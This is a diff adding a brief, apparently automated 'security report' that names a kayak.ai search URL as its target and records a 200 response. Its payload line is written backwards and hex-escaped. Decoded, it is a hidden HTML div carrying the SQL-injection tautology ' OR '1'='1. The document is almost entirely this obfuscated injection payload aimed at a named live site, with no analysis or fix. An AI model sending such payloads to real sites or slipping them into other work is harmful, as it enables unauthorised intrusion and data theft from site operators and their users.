@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=>vid
+
+[STATUS]: 200
+[PAYLOAD]: >vid/<13x\72x\d3x\72x\13x\72x\02x\25x\f4x\02x\72x\>'enon:yalpsid'=elyts vid<
+---
